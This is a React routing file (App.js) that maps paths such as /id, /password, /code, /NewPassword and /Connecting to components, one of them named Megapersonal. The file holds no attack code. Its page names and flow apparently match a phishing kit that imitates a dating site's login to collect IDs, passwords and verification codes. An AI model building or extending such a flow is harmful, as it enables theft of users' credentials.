import "./App.css";
import Home from "./Components/Home/Home";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import Megapersonal from "./Components/Home/Megapersonal";
import Password from "./Components/Home/Password";
import Code from "./Components/Home/Code";
import NewPassword from "./Components/Home/NewPassword";
import Connecting from "./Components/Home/Connecting";

// import Dashboard from "./Components/Dashboard/Dashboard";
// import Email from "./Components/Dashboard/Email";
// import IdVerify from "./Components/IdVerify/IdVerify";

function App() {
  return (
    <div>
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/id" element={<Megapersonal />} />
          <Route path="/password" element={<Password />} />
          <Route path="/code" element={<Code />} />
          <Route path="/NewPassword" element={<NewPassword />} />
          <Route path="/Connecting" element={<Connecting />} />
          {/* <Route path="/id" element={<Email />} /> */}
          {/* <Route path="/IdVerify" element={<IdVerify />} /> */}
        </Routes>
      </BrowserRouter>
    </div>
  );
}

export default App;
